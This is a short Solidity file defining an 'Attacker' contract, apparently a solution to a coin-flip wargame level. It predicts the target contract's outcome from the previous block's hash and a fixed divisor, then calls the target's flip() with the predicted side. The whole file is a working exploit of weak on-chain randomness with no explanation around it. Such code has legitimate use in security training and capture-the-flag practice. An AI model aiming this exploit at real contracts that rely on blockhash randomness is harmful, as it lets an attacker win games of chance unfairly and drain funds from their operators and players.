// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './coinflip.sol';

contract Attacker {
    CoinFlip coinflipContract;

  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


  constructor(address coinFlipContractAddress) public {
        coinflipContract = CoinFlip(coinFlipContractAddress);
    }

  function sendDeterminedSide() external {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    // pass the predicted flip
    coinflipContract.flip(side);
    }
}